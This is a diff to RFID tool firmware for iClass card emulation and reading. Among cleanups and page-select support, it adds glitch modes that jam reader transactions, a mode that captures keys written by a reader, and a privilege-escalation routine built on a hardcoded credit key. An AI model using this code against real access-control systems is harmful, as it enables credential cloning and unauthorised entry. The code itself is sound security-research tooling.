@@ -38,6 +38,7 @@
 #include "iso15693.h"
 #include "iclass_cmd.h"              // iclass_card_select_t struct
 #include "i2c.h"                     // i2c defines (SIM module access)
+#include "printf.h"
 
 uint8_t get_pagemap(const picopass_hdr_t *hdr) {
     return (hdr->conf.fuses & (FUSE_CRYPT0 | FUSE_CRYPT1)) >> 3;
@@ -136,10 +137,10 @@ static void CodeIClassTagSOF(void) {
  */
 // turn off afterwards
 void SimulateIClass(uint32_t arg0, uint32_t arg1, uint32_t arg2, uint8_t *datain) {
-    iclass_simulate(arg0, arg1, arg2, datain, NULL, NULL);
+    iclass_simulate(arg0, arg1, arg2, true, datain, NULL, NULL);
 }
 
-void iclass_simulate(uint8_t sim_type, uint8_t num_csns, bool send_reply, uint8_t *datain, uint8_t *dataout, uint16_t *dataoutlen) {
+void iclass_simulate(uint8_t sim_type, uint8_t num_csns, bool send_reply, bool trace, uint8_t *datain, uint8_t *dataout, uint16_t *dataoutlen) {
 
     LEDsoff();
 
@@ -147,8 +148,7 @@ void iclass_simulate(uint8_t sim_type, uint8_t num_csns, bool send_reply, uint8_
 
     clear_trace();
 
-    // only logg if we are called from the client.
-    set_tracing(send_reply);
+    set_tracing(trace);
 
     //Use the emulator memory for SIM
     uint8_t *emulator = BigBuf_get_EM_addr();
@@ -195,7 +195,7 @@ void iclass_simulate(uint8_t sim_type, uint8_t num_csns, bool send_reply, uint8_
         if (send_reply)
             reply_old(CMD_ACK, CMD_HF_ICLASS_SIMULATE, i, 0, mac_responses, i * EPURSE_MAC_SIZE);
 
-    } else if (sim_type == ICLASS_SIM_MODE_FULL) {
+    } else if (sim_type == ICLASS_SIM_MODE_FULL || sim_type == ICLASS_SIM_MODE_FULL_GLITCH || sim_type == ICLASS_SIM_MODE_FULL_GLITCH_KEY || sim_type == ICLASS_SIM_MODE_FULL_LIVE) {
 
         //This is 'full sim' mode, where we use the emulator storage for data.
         //ie:  BigBuf_get_EM_addr should be previously filled with data from the "eload" command
@@ -204,14 +204,12 @@ void iclass_simulate(uint8_t sim_type, uint8_t num_csns, bool send_reply, uint8_
         if (pagemap == PICOPASS_NON_SECURE_PAGEMODE) {
             do_iclass_simulation_nonsec();
         } else {
-            do_iclass_simulation(ICLASS_SIM_MODE_FULL, NULL);
+            do_iclass_simulation(sim_type, NULL);
         }
 
-    } else if (sim_type == ICLASS_SIM_MODE_CONFIG_CARD) {
-
-        // config card
-        do_iclass_simulation(ICLASS_SIM_MODE_FULL, NULL);
-        // swap bin
+        if (send_reply) {
+            reply_mix(CMD_ACK, CMD_HF_ICLASS_SIMULATE, 0, 0, NULL, 0);
+        }
 
     } else if (sim_type == ICLASS_SIM_MODE_READER_ATTACK_KEYROLL) {
 
@@ -273,9 +271,12 @@ void iclass_simulate(uint8_t sim_type, uint8_t num_csns, bool send_reply, uint8_
     }
 
 out:
-    if (dataout && dataoutlen)
+    if (dataout && dataoutlen) {
         memcpy(dataout, mac_responses, *dataoutlen);
+    }
 
+
+    FpgaResetBitstream();
     switch_off();
     BigBuf_free_keep_EM();
 }
@@ -289,6 +290,19 @@ out:
  * @param breakAfterMacReceived if true, returns after reader MAC has been received.
  */
 int do_iclass_simulation(int simulationMode, uint8_t *reader_mac_buf) {
+
+    // FULL_LIVE = FULL + inline EML_MEMSET handling so the client can push live
+    // emul updates (see hf iclass tagsim). All full sim modes still need USB
+    // polling so commands like hw break or eview can stop the ARM-side loop.
+    const bool handle_live_updates = (simulationMode == ICLASS_SIM_MODE_FULL_LIVE);
+    const bool allow_usb_interrupt =
+        simulationMode == ICLASS_SIM_MODE_FULL ||
+        simulationMode == ICLASS_SIM_MODE_FULL_GLITCH ||
+        simulationMode == ICLASS_SIM_MODE_FULL_GLITCH_KEY ||
+        handle_live_updates;
+    if (simulationMode == ICLASS_SIM_MODE_FULL_LIVE) {
+        simulationMode = ICLASS_SIM_MODE_FULL;
+    }
 
     // free eventually allocated BigBuf memory
     BigBuf_free_keep_EM();
@@ -329,7 +343,7 @@ int do_iclass_simulation(int simulationMode, uint8_t *reader_mac_buf) {
     // AIA
     uint8_t aia_data[10] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00};
 
-    if (simulationMode == ICLASS_SIM_MODE_FULL) {
+    if (simulationMode == ICLASS_SIM_MODE_FULL || simulationMode == ICLASS_SIM_MODE_FULL_GLITCH || simulationMode == ICLASS_SIM_MODE_FULL_GLITCH_KEY) {
 
         memcpy(conf_block, emulator + (8 * 1), 8);            // blk 1
         memcpy(card_challenge_data, emulator + (8 * 2), 8); // e-purse, blk 2
@@ -368,7 +382,7 @@ int do_iclass_simulation(int simulationMode, uint8_t *reader_mac_buf) {
     cipher_state_KD[0] = opt_doTagMAC_1(card_challenge_data, diversified_kd);
     cipher_state_KC[0] = opt_doTagMAC_1(card_challenge_data, diversified_kc);
 
-    if (simulationMode == ICLASS_SIM_MODE_FULL) {
+    if (simulationMode == ICLASS_SIM_MODE_FULL || simulationMode == ICLASS_SIM_MODE_FULL_GLITCH || simulationMode == ICLASS_SIM_MODE_FULL_GLITCH_KEY) {
 
         for (int i = 1; i < max_page; i++) {
 
@@ -380,6 +394,8 @@ int do_iclass_simulation(int simulationMode, uint8_t *reader_mac_buf) {
             cipher_state_KC[i] = opt_doTagMAC_1(epurse, kc);
         }
     }
+
+    bool glitch_key_read = false;
 
     // Anti-collision process:
     // Reader 0a
@@ -395,40 +411,40 @@ int do_iclass_simulation(int simulationMode, uint8_t *reader_mac_buf) {
     int trace_data_size;
 
     // Respond SOF -- takes 1 bytes
-    uint8_t *resp_sof = BigBuf_malloc(1);
+    uint8_t resp_sof[2] = {0};
     int resp_sof_len;
 
     // Anticollision CSN (rotated CSN)
     // 22: Takes 2 bytes for SOF/EOF and 10 * 2 = 20 bytes (2 bytes/byte)
-    uint8_t *resp_anticoll = BigBuf_malloc(22);
+    uint8_t *resp_anticoll = BigBuf_calloc(22);
     int resp_anticoll_len;
 
     // CSN (block 0)
     // 22: Takes 2 bytes for SOF/EOF and 10 * 2 = 20 bytes (2 bytes/byte)
-    uint8_t *resp_csn = BigBuf_malloc(22);
+    uint8_t *resp_csn = BigBuf_calloc(22);
     int resp_csn_len;
 
     // configuration (blk 1) PICOPASS 2ks
-    uint8_t *resp_conf = BigBuf_malloc(22);
+    uint8_t *resp_conf = BigBuf_calloc(22);
     int resp_conf_len;
 
     // e-Purse (blk 2)
     // 18: Takes 2 bytes for SOF/EOF and 8 * 2 = 16 bytes (2 bytes/bit)
-    uint8_t *resp_cc = BigBuf_malloc(18);
+    uint8_t *resp_cc = BigBuf_calloc(18);
     int resp_cc_len;
 
     // Kd, Kc (blocks 3 and 4). Cannot be read. Always respond with 0xff bytes only
-    uint8_t *resp_ff = BigBuf_malloc(22);
+    uint8_t *resp_ff = BigBuf_calloc(22);
     int resp_ff_len;
     uint8_t ff_data[10] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00};
     AddCrc(ff_data, 8);
 
     // Application Issuer Area  (blk 5)
-    uint8_t *resp_aia = BigBuf_malloc(22);
+    uint8_t *resp_aia = BigBuf_calloc(22);
     int resp_aia_len;
 
     // receive command
-    uint8_t *receivedCmd = BigBuf_malloc(MAX_FRAME_SIZE);
+    uint8_t *receivedCmd = BigBuf_calloc(MAX_FRAME_SIZE);
 
     // Prepare card messages
     tosend_t *ts = get_tosend();
@@ -470,11 +486,11 @@ int do_iclass_simulation(int simulationMode, uint8_t *reader_mac_buf) {
 
     //This is used for responding to READ-block commands or other data which is dynamically generated
     //First the 'trace'-data, not encoded for FPGA
-    uint8_t *data_generic_trace = BigBuf_malloc(34); // 32 bytes data + 2byte CRC is max tag answer
+    uint8_t *data_generic_trace = BigBuf_calloc(34); // 32 bytes data + 2byte CRC is max tag answer
 
     //Then storage for the modulated data
     //Each bit is doubled when modulated for FPGA, and we also have SOF and EOF (2 bytes)
-    uint8_t *data_response = BigBuf_malloc((34 * 2) + 3);
+    uint8_t *data_response = BigBuf_calloc((34 * 2) + 3);
 
     enum { IDLE, ACTIVATED, SELECTED, HALTED } chip_state = IDLE;
 
@@ -495,7 +511,35 @@ int do_iclass_simulation(int simulationMode, uint8_t *reader_mac_buf) {
         trace_data_size = 0;
 
         uint32_t reader_eof_time = 0;
-        len = GetIso15693CommandFromReader(receivedCmd, MAX_FRAME_SIZE, &reader_eof_time);
+        len = GetIso15693CommandFromReader(receivedCmd, MAX_FRAME_SIZE, &reader_eof_time, allow_usb_interrupt);
+        if (len == -2) {
+            if (handle_live_updates == false) {
+                exit_loop = true;
+                continue;
+            }
+
+            // USB data arrived while waiting for RF — drain all pending EML_MEMSET
+            // commands inline (without FpgaDownloadAndGo) so live tag updates work.
+            PacketCommandNG rx;
+            while (data_available()) {
+                if (receive_ng(&rx) != PM3_SUCCESS) break;
+                if (rx.cmd == CMD_HF_ICLASS_EML_MEMSET) {
+                    struct p {
+                        uint16_t offset;
+                        uint16_t plen;
+                        uint8_t  data[];
+                    } PACKED;
+                    struct p *payload = (struct p *) rx.data.asBytes;
+                    emlSet(payload->data, payload->offset, payload->plen);
+                } else {
+                    // LIVE mode owns this packet; non-EML traffic (break or stray
+                    // commands) is treated as an abort and is not redispatched.
+                    exit_loop = true;
+                    break;
+                }
+            }
+            continue;
+        }
         if (len < 0) {
             button_pressed = true;
             exit_loop = true;
@@ -508,6 +552,45 @@ int do_iclass_simulation(int simulationMode, uint8_t *reader_mac_buf) {
         block = receivedCmd[1];
 
         if (cmd == ICLASS_CMD_ACTALL && len == 1) {   // 0x0A
+
+            // Check for a live tag-identity reload requested by the client.
+            // The client writes a non-zero byte to emulator offset 32*8 = 256
+            // (one byte past the 32-block tag data) then updates blocks 0, 3, 4, 6-9
+            // in emulator memory.  We pick it up at the start of each anti-collision
+            // cycle so the reader sees the new identity from the very first SELECT.
+            if ((simulationMode == ICLASS_SIM_MODE_FULL ||
+                    simulationMode == ICLASS_SIM_MODE_FULL_GLITCH ||
+                    simulationMode == ICLASS_SIM_MODE_FULL_GLITCH_KEY) &&
+                    emulator[32 * 8] != 0) {
+
+                emulator[32 * 8] = 0;  // consume the flag
+
+                // Reload CSN (block 0) and rebuild anticollision/CSN responses
+                memcpy(csn_data, emulator, 8);
+                rotateCSN(csn_data, anticoll_data);
+                AddCrc(anticoll_data, 8);
+                AddCrc(csn_data, 8);
+
+                CodeIso15693AsTag(anticoll_data, sizeof(anticoll_data));
+                memcpy(resp_anticoll, ts->buf, ts->max);
+                resp_anticoll_len = ts->max;
+
+                CodeIso15693AsTag(csn_data, sizeof(csn_data));
+                memcpy(resp_csn, ts->buf, ts->max);
+                resp_csn_len = ts->max;
+
+                // Reload KD/KC (blocks 3 & 4) and recompute cipher states
+                memcpy(diversified_kd, emulator + (8 * 3), 8);
+                memcpy(diversified_kc, emulator + (8 * 4), 8);
+                cipher_state_KD[0] = opt_doTagMAC_1(card_challenge_data, diversified_kd);
+                cipher_state_KC[0] = opt_doTagMAC_1(card_challenge_data, diversified_kc);
+
+                // Reset per-transaction auth state
+                kc_attempt = 0;
+                using_kc = false;
+                cipher_state = &cipher_state_KD[0];
+            }
+
             // Reader in anti collision phase
             modulated_response = resp_sof;
             modulated_response_size = resp_sof_len;
@@ -601,13 +684,27 @@ int do_iclass_simulation(int simulationMode, uint8_t *reader_mac_buf) {
                         goto send;
                     }
                 } // switch
-            } else if (simulationMode == ICLASS_SIM_MODE_FULL) {
+            } else if (simulationMode == ICLASS_SIM_MODE_FULL || simulationMode == ICLASS_SIM_MODE_FULL_GLITCH || simulationMode == ICLASS_SIM_MODE_FULL_GLITCH_KEY) {
                 if (block == 3 || block == 4) { // Kd, Kc, always respond with 0xff bytes
                     modulated_response = resp_ff;
                     modulated_response_size = resp_ff_len;
                     trace_data = ff_data;
                     trace_data_size = sizeof(ff_data);
                 } else { // use data from emulator memory
+                    if (simulationMode == ICLASS_SIM_MODE_FULL_GLITCH) {
+                        //Jam the read based on the last SIO block
+                        if (memcmp(emulator + (current_page * page_size) + (5 * 8), ff_data, PICOPASS_BLOCK_SIZE) == 0) { //SR card
+                            if (block == 16) { //SR cards use a standard legth SIO
+                                goto send;
+                            }
+                        } else { //For SE cards we have to account for different SIO lengths depending if a standard or custom key is used
+                            uint8_t *sio = emulator + (current_page * page_size) + (6 * 8);
+                            if (block == (5 + ((sio[1] + 12) / 8))) {
+                                goto send;
+                            }
+                        }
+                    }
+
                     memcpy(data_generic_trace, emulator + (current_page * page_size) + (block * 8), 8);
                     AddCrc(data_generic_trace, 8);
                     trace_data = data_generic_trace;
@@ -650,7 +747,12 @@ int do_iclass_simulation(int simulationMode, uint8_t *reader_mac_buf) {
                 goto send;
             }
 
-            if (simulationMode == ICLASS_SIM_MODE_FULL) {
+            if (simulationMode == ICLASS_SIM_MODE_FULL || simulationMode == ICLASS_SIM_MODE_FULL_GLITCH || simulationMode == ICLASS_SIM_MODE_FULL_GLITCH_KEY) {
+
+                if (glitch_key_read) {
+                    goto send;
+                }
+
                 // NR, from reader, is in receivedCmd +1
                 opt_doTagMAC_2(*cipher_state, receivedCmd + 1, data_generic_trace, diversified_key);
 
@@ -717,7 +819,7 @@ int do_iclass_simulation(int simulationMode, uint8_t *reader_mac_buf) {
             chip_state = HALTED;
             goto send;
 
-        } else if (simulationMode == ICLASS_SIM_MODE_FULL && cmd == ICLASS_CMD_READ4 && len == 4) {  // 0x06
+        } else if ((simulationMode == ICLASS_SIM_MODE_FULL || simulationMode == ICLASS_SIM_MODE_FULL_GLITCH || simulationMode == ICLASS_SIM_MODE_FULL_GLITCH_KEY) && cmd == ICLASS_CMD_READ4 && len == 4) { // 0x06
 
             if (chip_state != SELECTED) {
                 goto send;
@@ -758,20 +860,24 @@ int do_iclass_simulation(int simulationMode, uint8_t *reader_mac_buf) {
                 resp_cc_len = ts->max;
                 cipher_state_KD[current_page] = opt_doTagMAC_1(card_challenge_data, diversified_kd);
                 cipher_state_KC[current_page] = opt_doTagMAC_1(card_challenge_data, diversified_kc);
-                if (simulationMode == ICLASS_SIM_MODE_FULL) {
+                if (simulationMode == ICLASS_SIM_MODE_FULL || simulationMode == ICLASS_SIM_MODE_FULL_GLITCH || simulationMode == ICLASS_SIM_MODE_FULL_GLITCH_KEY) {
                     memcpy(emulator + (current_page * page_size) + (8 * 2), card_challenge_data, 8);
                 }
             } else if (block == 3) { // update Kd
                 for (int i = 0; i < 8; i++) {
-                    if (personalization_mode) {
+                    if (personalization_mode || simulationMode == ICLASS_SIM_MODE_FULL_GLITCH_KEY) {
                         diversified_kd[i] = receivedCmd[2 + i];
                     } else {
                         diversified_kd[i] ^= receivedCmd[2 + i];
                     }
                 }
                 cipher_state_KD[current_page] = opt_doTagMAC_1(card_challenge_data, diversified_kd);
-                if (simulationMode == ICLASS_SIM_MODE_FULL) {
+                if (simulationMode == ICLASS_SIM_MODE_FULL || simulationMode == ICLASS_SIM_MODE_FULL_GLITCH || simulationMode == ICLASS_SIM_MODE_FULL_GLITCH_KEY) {
                     memcpy(emulator + (current_page * page_size) + (8 * 3), diversified_kd, 8);
+                    if (simulationMode == ICLASS_SIM_MODE_FULL_GLITCH_KEY) {
+                        glitch_key_read = true;
+                        goto send;
+                    }
                 }
             } else if (block == 4) { // update Kc
                 for (int i = 0; i < 8; i++) {
@@ -782,12 +888,28 @@ int do_iclass_simulation(int simulationMode, uint8_t *reader_mac_buf) {
                     }
                 }
                 cipher_state_KC[current_page] = opt_doTagMAC_1(card_challenge_data, diversified_kc);
-                if (simulationMode == ICLASS_SIM_MODE_FULL) {
+                if (simulationMode == ICLASS_SIM_MODE_FULL || simulationMode == ICLASS_SIM_MODE_FULL_GLITCH || simulationMode == ICLASS_SIM_MODE_FULL_GLITCH_KEY) {
                     memcpy(emulator + (current_page * page_size) + (8 * 4), diversified_kc, 8);
                 }
-            } else if (simulationMode == ICLASS_SIM_MODE_FULL) {
+            } else if (simulationMode == ICLASS_SIM_MODE_FULL || simulationMode == ICLASS_SIM_MODE_FULL_GLITCH || simulationMode == ICLASS_SIM_MODE_FULL_GLITCH_KEY) {
                 // update emulator memory
                 memcpy(emulator + (current_page * page_size) + (8 * block), receivedCmd + 2, 8);
+            }
+
+            if (simulationMode == ICLASS_SIM_MODE_FULL_GLITCH) {
+                // jam the read based on the last SIO block
+                uint8_t *sr_or_sio = emulator + (current_page * page_size) + (6 * 8);
+                if (memcmp(emulator + (current_page * page_size) + (5 * 8), ff_data, PICOPASS_BLOCK_SIZE) == 0) { // SR card
+                    if (block == 16) { // SR cards use a standard legth SIO
+                        // update block 6 byte 1 from 03 to A3
+                        sr_or_sio[0] |= 0xA0;
+                        goto send;
+                    }
+                } else { // for SE cards we have to account for different SIO lengths depending if a standard or custom key is used
+                    if (block == (5 + ((sr_or_sio[1] + 12) / 8))) {
+                        goto send;
+                    }
+                }
             }
 
             memcpy(data_generic_trace, receivedCmd + 2, 8);
@@ -809,7 +931,7 @@ int do_iclass_simulation(int simulationMode, uint8_t *reader_mac_buf) {
                 goto send;
             }
 
-            if (simulationMode == ICLASS_SIM_MODE_FULL && max_page > 0) {
+            if ((simulationMode == ICLASS_SIM_MODE_FULL || simulationMode == ICLASS_SIM_MODE_FULL_GLITCH || simulationMode == ICLASS_SIM_MODE_FULL_GLITCH_KEY) && max_page > 0) {
 
                 // if on 2k,  always ignore 3msb,  & 0x1F)
                 uint8_t page = receivedCmd[1] & 0x1F;
@@ -841,6 +963,9 @@ int do_iclass_simulation(int simulationMode, uint8_t *reader_mac_buf) {
             goto send;
 
         } else if (cmd == ICLASS_CMD_DETECT) { // 0x0F
+            // if EAS byte in config block,   (normally 0xFF,  but 0x7F)
+            //    MSB = 1  ,  don't answe with CSN
+            //    MSB = 0  == enabled ,  answer with CSN
             // not supported yet, ignore
 //        } else if (cmd == 0x26 && len == 5) {
             // standard ISO15693 INVENTORY command. Ignore.
@@ -877,8 +1002,10 @@ send:
 
     LEDsoff();
 
-    if (button_pressed)
+    if (button_pressed) {
         DbpString("button pressed");
+    }
+
 
     return button_pressed;
 }
@@ -938,29 +1065,29 @@ int do_iclass_simulation_nonsec(void) {
     int trace_data_size = 0;
 
     // Respond SOF -- takes 1 bytes
-    uint8_t *resp_sof = BigBuf_malloc(2);
+    uint8_t resp_sof[2] = { 0 };
     int resp_sof_len;
 
     // Anticollision CSN (rotated CSN)
     // 22: Takes 2 bytes for SOF/EOF and 10 * 2 = 20 bytes (2 bytes/byte)
-    uint8_t *resp_anticoll = BigBuf_malloc(28);
+    uint8_t *resp_anticoll = BigBuf_calloc(28);
     int resp_anticoll_len;
 
     // CSN
     // 22: Takes 2 bytes for SOF/EOF and 10 * 2 = 20 bytes (2 bytes/byte)
-    uint8_t *resp_csn = BigBuf_malloc(28);
+    uint8_t *resp_csn = BigBuf_calloc(28);
     int resp_csn_len;
 
     // configuration (blk 1) PICOPASS 2ks
-    uint8_t *resp_conf = BigBuf_malloc(28);
+    uint8_t *resp_conf = BigBuf_calloc(28);
     int resp_conf_len;
 
     // Application Issuer Area  (blk 5)
-    uint8_t *resp_aia = BigBuf_malloc(28);
+    uint8_t *resp_aia = BigBuf_calloc(28);
     int resp_aia_len;
 
     // receive command
-    uint8_t *receivedCmd = BigBuf_malloc(MAX_FRAME_SIZE);
+    uint8_t *receivedCmd = BigBuf_calloc(MAX_FRAME_SIZE);
 
     // Prepare card messages
     tosend_t *ts = get_tosend();
@@ -993,11 +1120,11 @@ int do_iclass_simulation_nonsec(void) {
 
     //This is used for responding to READ-block commands or other data which is dynamically generated
     //First the 'trace'-data, not encoded for FPGA
-    uint8_t *data_generic_trace = BigBuf_malloc(32 + 2); // 32 bytes data + 2byte CRC is max tag answer
+    uint8_t *data_generic_trace = BigBuf_calloc(32 + 2); // 32 bytes data + 2byte CRC is max tag answer
 
     //Then storage for the modulated data
     //Each bit is doubled when modulated for FPGA, and we also have SOF and EOF (2 bytes)
-    uint8_t *data_response = BigBuf_malloc((32 + 2) * 2 + 2);
+    uint8_t *data_response = BigBuf_calloc((32 + 2) * 2 + 2);
 
     enum { IDLE, ACTIVATED, SELECTED, HALTED } chip_state = IDLE;
 
@@ -1010,7 +1137,13 @@ int do_iclass_simulation_nonsec(void) {
         WDT_HIT();
 
         uint32_t reader_eof_time = 0;
-        len = GetIso15693CommandFromReader(receivedCmd, MAX_FRAME_SIZE, &reader_eof_time);
+        len = GetIso15693CommandFromReader(receivedCmd, MAX_FRAME_SIZE, &reader_eof_time, true);
+        if (len == -2) {
+            // Non-secure simulation has no live reload/update path; any USB
+            // command interrupts the sim and is handled by the main dispatcher.
+            exit_loop = true;
+            continue;
+        }
         if (len < 0) {
             button_pressed = true;
             exit_loop = true;
@@ -1240,7 +1373,6 @@ static bool iclass_send_cmd_with_retries(uint8_t *cmd, size_t cmdsize, uint8_t *
     while (tries-- > 0) {
 
         iclass_send_as_reader(cmd, cmdsize, start_time, eof_time, shallow_mod);
-
         if (resp == NULL) {
             return true;
         }
@@ -1266,7 +1398,7 @@ static bool iclass_send_cmd_with_retries(uint8_t *cmd, size_t cmdsize, uint8_t *
  * @return false = fail
  *         true = Got all.
  */
-static bool select_iclass_tag_ex(picopass_hdr_t *hdr, bool use_credit_key, uint32_t *eof_time, uint8_t *status, bool shallow_mod) {
+static bool select_iclass_tag_ex(picopass_hdr_t *hdr, bool use_credit_key, uint32_t *eof_time, uint8_t *status, bool shallow_mod, uint8_t page) {
 
     static uint8_t act_all[] = { ICLASS_CMD_ACTALL };
     static uint8_t identify[] = { ICLASS_CMD_READ_OR_IDENTIFY, 0x00, 0x73, 0x33 };
@@ -1313,6 +1445,21 @@ static bool select_iclass_tag_ex(picopass_hdr_t *hdr, bool use_credit_key, uint3
 
     // save CSN
     memcpy(hdr->csn, resp, sizeof(hdr->csn));
+
+    // card selected, select page if not page 0
+    if (page != 0) {
+        uint8_t pagesel_resp[10];
+        start_time = *eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+        uint8_t pagesel[] = {0x80 | ICLASS_CMD_PAGESEL, page, 0x00, 0x00};
+        AddCrc(pagesel + 1, 1);
+
+        bool pagesel_res = iclass_send_cmd_with_retries(pagesel, sizeof(pagesel), pagesel_resp, sizeof(resp),
+                                                        10, 2, &start_time, ICLASS_READER_TIMEOUT_OTHERS, eof_time, shallow_mod);
+
+        if (pagesel_res == false) {
+            return false;
+        }
+    }
 
     // card selected, now read config (block1) (only 8 bytes no CRC)
     start_time = *eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
@@ -1388,12 +1535,21 @@ static bool select_iclass_tag_ex(picopass_hdr_t *hdr, bool use_credit_key, uint3
 
 bool select_iclass_tag(picopass_hdr_t *hdr, bool use_credit_key, uint32_t *eof_time, bool shallow_mod) {
     uint8_t result = 0;
-    return select_iclass_tag_ex(hdr, use_credit_key, eof_time, &result, shallow_mod);
+    return select_iclass_tag_ex(hdr, use_credit_key, eof_time, &result, shallow_mod, 0); // page 0 unless specified
+}
+
+
+bool select_iclass_tag_and_page(picopass_hdr_t *hdr, bool use_credit_key, uint32_t *eof_time, bool shallow_mod, uint8_t page) {
+    uint8_t result = 0;
+    return select_iclass_tag_ex(hdr, use_credit_key, eof_time, &result, shallow_mod, page);
 }
 
 // Reader iClass Anticollission
 // turn off afterwards
-void ReaderIClass(uint8_t flags) {
+void ReaderIClass(uint8_t *msg) {
+    iclass_card_select_t *cmd = (iclass_card_select_t *)msg;
+    uint8_t flags = cmd->flags;
+    uint8_t page = cmd->page;
 
     // flag to use credit key
     bool use_credit_key = ((flags & FLAG_ICLASS_READER_CREDITKEY) == FLAG_ICLASS_READER_CREDITKEY);
@@ -1412,7 +1568,7 @@ void ReaderIClass(uint8_t flags) {
     uint32_t eof_time = 0;
     picopass_hdr_t hdr = {0};
 
-    if (select_iclass_tag_ex(&hdr, use_credit_key, &eof_time, &res, shallow_mod) == false) {
+    if (select_iclass_tag_ex(&hdr, use_credit_key, &eof_time, &res, shallow_mod, page) == false) {
         reply_ng(CMD_HF_ICLASS_READER, PM3_ERFTRANS, NULL, 0);
         goto out;
     }
@@ -1578,8 +1734,9 @@ bool iclass_read_block(uint16_t blockno, uint8_t *data, uint32_t *start_time, ui
     uint8_t c[] = {ICLASS_CMD_READ_OR_IDENTIFY, blockno, 0x00, 0x00};
     AddCrc(c + 1, 1);
     bool isOK = iclass_send_cmd_with_retries(c, sizeof(c), resp, sizeof(resp), 10, 2, start_time, ICLASS_READER_TIMEOUT_OTHERS, eof_time, shallow_mod);
-    if (isOK)
+    if (isOK) {
         memcpy(data, resp, 8);
+    }
     return isOK;
 }
 
@@ -1659,10 +1816,11 @@ void iClass_Dump(uint8_t *msg) {
     iclass_dump_req_t *cmd = (iclass_dump_req_t *)msg;
     iclass_auth_req_t *req = &cmd->req;
     bool shallow_mod = req->shallow_mod;
+    uint8_t page = cmd->page;
 
-    uint8_t *dataout = BigBuf_malloc(ICLASS_16KS_SIZE);
+    uint8_t *dataout = BigBuf_calloc(ICLASS_16KS_SIZE);
     if (dataout == NULL) {
-        DbpString("fail to allocate memory");
+        DbpString("Failed to allocate memory");
         if (req->send_reply) {
             reply_ng(CMD_HF_ICLASS_DUMP, PM3_EMALLOC, NULL, 0);
         }
@@ -1673,12 +1831,12 @@ void iClass_Dump(uint8_t *msg) {
 
     Iso15693InitReader();
 
-    // select tag.
+    // select tag and page
     uint32_t eof_time = 0;
     picopass_hdr_t hdr = {0};
     memset(&hdr, 0xff, sizeof(picopass_hdr_t));
 
-    bool res = select_iclass_tag(&hdr, req->use_credit_key, &eof_time, shallow_mod);
+    bool res = select_iclass_tag_and_page(&hdr, req->use_credit_key, &eof_time, shallow_mod, page);
     if (res == false) {
         if (req->send_reply) {
             reply_ng(CMD_HF_ICLASS_DUMP, PM3_ETIMEOUT, NULL, 0);
@@ -1776,13 +1934,13 @@ static bool iclass_writeblock_ext(uint8_t blockno, uint8_t *data, uint8_t *mac, 
         }
     } else if (blockno == 3 || blockno == 4) {
         // check response. Key updates always return 0xffffffffffffffff
-        uint8_t all_ff[8] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
-        if (memcmp(all_ff, resp, 8)) {
+        uint8_t all_ff[PICOPASS_BLOCK_SIZE] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+        if (memcmp(all_ff, resp, PICOPASS_BLOCK_SIZE)) {
             return false;
         }
     } else {
         // check response. All other updates return unchanged data
-        if (memcmp(data, resp, 8)) {
+        if (memcmp(data, resp, PICOPASS_BLOCK_SIZE)) {
             return false;
         }
     }
@@ -1790,8 +1948,66 @@ static bool iclass_writeblock_ext(uint8_t blockno, uint8_t *data, uint8_t *mac, 
     return true;
 }
 
+static bool iclass_writeblock_sp(uint8_t blockno, uint8_t *data, uint8_t *mac, bool shallow_mod, uint32_t *start_time, uint32_t *eof_time, bool short_delay) {
+
+    // write command: cmd, 1 blockno, 8 data, 4 mac
+    uint8_t write[14] = { 0x80 | ICLASS_CMD_UPDATE, blockno };
+    uint8_t write_len = 14;
+    memcpy(write + 2, data, 8);
+    memcpy(write + 10, mac, 4);
+
+    uint8_t resp[10] = {0};
+    bool isOK = false;
+    if (short_delay) {
+        isOK = iclass_send_cmd_with_retries(write, write_len, resp, sizeof(resp), 10, 3, start_time, ICLASS_READER_TIMEOUT_UPDATE_FAST, eof_time, shallow_mod);
+    } else {
+        isOK = iclass_send_cmd_with_retries(write, write_len, resp, sizeof(resp), 10, 3, start_time, ICLASS_READER_TIMEOUT_UPDATE, eof_time, shallow_mod);
+    }
+    if (isOK == false) {
+        return false;
+    }
+
+    // check response. All other updates return unchanged data
+    if (memcmp(data, resp, PICOPASS_BLOCK_SIZE)) {
+        return false;
+    }
+
+    return true;
+}
+
+uint8_t credit_key[8] = {0xFD, 0xCB, 0x5A, 0x52, 0xEA, 0x8F, 0x30, 0x90};
+
+static bool do_privilege_escalation(uint8_t *read_check_cc, size_t cc_len, uint32_t *eof_time) {
+
+    int priv_esc_tries = 5;
+
+    while (priv_esc_tries--) {
+
+        uint16_t resp_len = 0;
+        uint8_t resp[10] = {0};
+        //The privilege escalation is done with a readcheck and not just a normal read!
+        uint32_t start_time = *eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+
+        iclass_send_as_reader(read_check_cc, cc_len, &start_time, eof_time, false);
+        // expect a 8-byte response here
+        int res = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, eof_time, false, true, &resp_len);
+        if (res == PM3_SUCCESS && resp_len == 8) {
+            return true;
+        }
+    }
+
+    if (g_dbglevel == DBG_INFO) {
+        DbpString("");
+        DbpString(_RED_("Unable to complete privilege escalation! Stopping."));
+    }
+    return false;
+}
+
 // turn off afterwards
 void iClass_WriteBlock(uint8_t *msg) {
+    bool priv_esc = false;
+    uint8_t read_check_cc[] = { 0x10 | ICLASS_CMD_READCHECK, 0x18 };
+    uint8_t div_cc[8] = {0};
 
     LED_A_ON();
 
@@ -1811,6 +2027,9 @@ void iClass_WriteBlock(uint8_t *msg) {
         goto out;
     }
 
+    iclass_calc_div_key(hdr.csn, credit_key, div_cc, false);
+    read_check_cc[1] = hdr.conf.app_limit + 1; //first block of AA2
+
     uint32_t start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
 
     uint8_t mac[4] = {0};
@@ -1825,7 +2044,7 @@ void iClass_WriteBlock(uint8_t *msg) {
     }
 
     // new block data
-    memcpy(write + 2, payload->data, 8);
+    memcpy(write + 2, payload->data, PICOPASS_BLOCK_SIZE);
 
     uint8_t pagemap = get_pagemap(&hdr);
